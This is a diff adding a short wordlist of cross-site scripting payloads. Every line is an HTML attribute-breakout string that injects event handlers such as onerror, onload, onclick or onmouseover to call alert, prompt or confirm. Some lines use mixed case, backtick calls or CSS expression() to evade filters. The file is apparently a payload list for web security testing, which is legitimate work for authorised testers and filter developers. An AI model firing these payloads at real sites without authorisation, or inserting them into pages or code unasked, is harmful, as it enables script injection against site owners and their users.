@@ -1,0 +1,13 @@
+"document.body.addEventListener("DOMActivate",prompt(document.domain))//
+"onload=prompt(document.domain)//
+" onclick=alert(1)//<button  onclick=alert(1)//> */ alert(1)//
+" onfocus=alert(document.domain) "> <"
+" onerror=alert(1) "
+" onerror=alert(1) x="
+"oNmoUsEoVeR=confIrm`1`//
+"onClICK=prompt`1` a="
+" OnUnLOAd=alert(1) x="
+"oNxxx=alert(1337) //
+" accessKey=x onCliCK=prompt`1`//
+' style=abc:expression(X) ' \" style=abc:expression(X) \"
+" type=image src=null onerror=X " \' type=image src=null onerror=X \'
